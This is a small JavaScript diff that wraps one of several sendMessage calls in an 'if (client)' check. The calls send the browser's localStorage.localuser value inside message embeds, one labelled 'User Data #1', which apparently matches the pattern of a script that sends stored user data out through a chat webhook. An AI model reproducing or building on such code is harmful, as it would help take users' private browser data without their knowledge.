@@ -20,6 +20,7 @@ sendMessage({
     }
   ]
 })
+if (client) {
 sendMessage({  "content": "User Data #1 ("+localStorage.localuser+")",
   "embeds": [
     {
@@ -31,6 +32,7 @@ sendMessage({  "content": "User Data #1 ("+localStorage.localuser+")",
     }
   ]
 })
+}
 sendMessage({  "content": "("+localStorage.localuser+")",
   "embeds": [
     {
